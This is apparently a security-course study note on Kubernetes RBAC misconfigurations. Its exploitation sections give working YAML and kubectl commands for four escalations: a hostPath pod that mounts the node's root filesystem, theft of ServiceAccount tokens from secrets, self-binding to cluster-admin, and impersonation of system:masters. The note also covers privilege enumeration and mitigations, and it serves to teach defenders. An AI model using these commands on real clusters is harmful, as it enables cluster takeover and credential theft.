---
tags: [kubernetes, rbac, k8s, privesc, clusteradmin]
difficulty: advanced
module: "38 - Container and Kubernetes Security"
topic: "38.11 K8s RBAC"
---

# Kubernetes RBAC — ClusterAdmin Misconfig

## Introduction
Role-Based Access Control (RBAC) is the primary authorization mechanism in Kubernetes. It dictates exactly *who* (a user or a ServiceAccount) can perform *what* action (get, list, create, delete) on *which* resource (pods, secrets, deployments). 

Because Kubernetes is API-driven, securing the cluster relies entirely on configuring RBAC correctly. When administrators assign overly permissive roles—particularly roles that grant `cluster-admin` privileges or paths to escalate to `cluster-admin`—they provide attackers with the exact mechanisms needed to achieve total cluster compromise. 

## Understanding the RBAC Architecture

The RBAC system is built on four core API objects:

```mermaid
graph TD
    subgraph SUBJECTS <br/> Who is acting?
        A[1. User Account <br/> Humans/SSO]
        B[2. ServiceAccount <br/> Pods/Bots]
        C[3. Group]
    end
    
    subgraph BINDINGS <br/> Connecting the two
        D[RoleBinding <br/> Namespace-scoped]
        E[ClusterRoleBinding <br/> Cluster-wide]
    end
    
    subgraph ROLES <br/> What can they do?
        F[Role <br/> Rules in a namespace]
        G[ClusterRole <br/> Rules cluster-wide]
    end
    
    A --> D
    D --> F
    B --> E
    E --> G
```

1.  **Role**: Defines permissions within a specific **namespace** (e.g., "can read secrets in the `frontend` namespace").
2.  **ClusterRole**: Defines permissions **cluster-wide** across all namespaces (e.g., "can read secrets in *all* namespaces", or managing nodes).
3.  **RoleBinding**: Grants the permissions defined in a Role (or ClusterRole) to a user/group/ServiceAccount within a **specific namespace**.
4.  **ClusterRoleBinding**: Grants the permissions defined in a ClusterRole **cluster-wide**.

## The Ultimate Target: `cluster-admin`
Kubernetes ships with a default ClusterRole named `cluster-admin`. This role contains a wildcard `*` for API groups and resources. It represents superuser (root) access over the entire Kubernetes API. If an attacker obtains a token for a ServiceAccount bound to this role, the cluster is fully compromised.

## Deep Dive: Dangerous RBAC Misconfigurations and Exploitation

Often, administrators do not assign `cluster-admin` directly, but they assign permissions that allow an attacker to *escalate* to `cluster-admin`. Here are the most critical escalation vectors.

### 1. The `create pods` Privilege (The Ultimate Bypass)
If a ServiceAccount has permission to create Pods in a namespace, it is generally game over for that namespace (and often the cluster).
*   **The Misconfig**:
    ```yaml
    rules:
    - apiGroups: [""]
      resources: ["pods"]
      verbs: ["create"]
    ```
*   **Exploitation**: An attacker can create a malicious Pod that mounts the underlying worker node's root filesystem `/` into the container.
    ```yaml
    apiVersion: v1
    kind: Pod
    metadata:
      name: privesc-pod
    spec:
      containers:
      - name: shell
        image: alpine:latest
        command: ["/bin/sh", "-c", "sleep 3600"]
        volumeMounts:
        - name: root-fs
          mountPath: /host
      volumes:
      - name: root-fs
        hostPath:
          path: /
    ```
    Once the pod is created, the attacker executes into it (`kubectl exec -it privesc-pod -- sh`), chroots into `/host`, and compromises the underlying Node (extracting kubelet credentials, which often have high privileges).

### 2. The `get/list secrets` Privilege
Kubernetes Secrets store sensitive data like database passwords, API keys, and ServiceAccount tokens.
*   **The Misconfig**: Granting read access to secrets cluster-wide or in sensitive namespaces (like `kube-system`).
    ```yaml
    rules:
    - apiGroups: [""]
      resources: ["secrets"]
      verbs: ["get", "list"]
    ```
*   **Exploitation**: The attacker simply queries the API server for all secrets. They look specifically for tokens belonging to highly privileged ServiceAccounts (like `namespace-controller` or `cluster-admin` bindings). They extract the JWT token from the secret, configure their local `kubectl` to use it, and instantly adopt those privileges.

### 3. The `create rolebindings` or `clusterrolebindings` Privilege
If an account can create bindings, it can assign *any* existing role to itself.
*   **The Misconfig**:
    ```yaml
    rules:
    - apiGroups: ["rbac.authorization.k8s.io"]
      resources: ["rolebindings", "clusterrolebindings"]
      verbs: ["create"]
    ```
*   **Exploitation**: The attacker creates a `ClusterRoleBinding` linking their current low-privilege ServiceAccount to the default `cluster-admin` ClusterRole.
    ```bash
    kubectl create clusterrolebinding my-admin-binding \
      --clusterrole=cluster-admin \
      --serviceaccount=default:compromised-sa
    ```
    The attacker has now explicitly granted themselves cluster-admin.

### 4. Impersonation Privileges (`impersonate`)
Kubernetes supports user impersonation (like `sudo`). 
*   **The Misconfig**:
    ```yaml
    rules:
    - apiGroups: [""]
      resources: ["users", "groups", "serviceaccounts"]
      verbs: ["impersonate"]
    ```
*   **Exploitation**: The attacker can send API requests masquerading as a more privileged user or group. They typically impersonate the `system:masters` group, which is hardcoded in the API server to bypass all RBAC checks (it is the ultimate root).
    ```bash
    kubectl get secrets --as-group=system:masters
    ```

## Post-Exploitation: Validating Privileges

When an attacker lands inside a pod, their first step is to assess their RBAC privileges using the mounted ServiceAccount token (`/var/run/secrets/kubernetes.io/serviceaccount/token`).

They use the Self-Subject Access Review API, typically abstracted by the `kubectl auth can-i` command.

```bash
# Can I do anything? (Looking for wildcards)
kubectl auth can-i '*' '*'

# Can I create pods in the kube-system namespace?
kubectl auth can-i create pods -n kube-system

# Can I read secrets?
kubectl auth can-i get secrets --all-namespaces
```

Tools like **Peirates**, **KubiScan**, and **Traitor** automate this discovery process, parsing the RBAC rules and highlighting exact escalation paths.

## Mitigation Strategies

1.  **Principle of Least Privilege**: Never use wildcards (`*`) in verbs or resources unless absolutely necessary.
2.  **Avoid Automounting Tokens**: If a Pod does not need to communicate with the Kubernetes API, disable the token mount:
    ```yaml
    apiVersion: v1
    kind: Pod
    spec:
      automountServiceAccountToken: false
    ```
3.  **Audit `ClusterRoleBindings`**: Regularly audit accounts bound to `cluster-admin`. There should be extremely few.
4.  **Use Policy Engines**: Implement Admission Controllers like **OPA Gatekeeper** or **Kyverno** to enforce policies that block the creation of privileged pods (e.g., blocking `hostPath` mounts) even if a user has the RBAC permission to create pods.

## Chaining Opportunities
*   [[06 - Application RCE in Containers]]: Application RCE is the initial vector. The attacker gains execution inside the pod, reads the ServiceAccount token, and uses it to interrogate the RBAC system.
*   [[10 - Kubernetes Architecture — Control Plane, Nodes, Pods]]: RBAC exploitation is executed via the `kube-apiserver`. A deep understanding of API endpoints is required to manually craft curl requests if `kubectl` is unavailable.
*   [[12 - Exposed Kubernetes Dashboard]]: The dashboard operates using a ServiceAccount. If that account has overly permissive RBAC, exposing the dashboard exposes the entire cluster.

## Related Notes
*   [[14 - Advanced Pod Security Standards (PSS)]]
*   [[15 - Kubelet API Exploitation and Anonymous Auth]]
*   [[17 - Auditing K8s with Kubeaudit and Kubescape]]
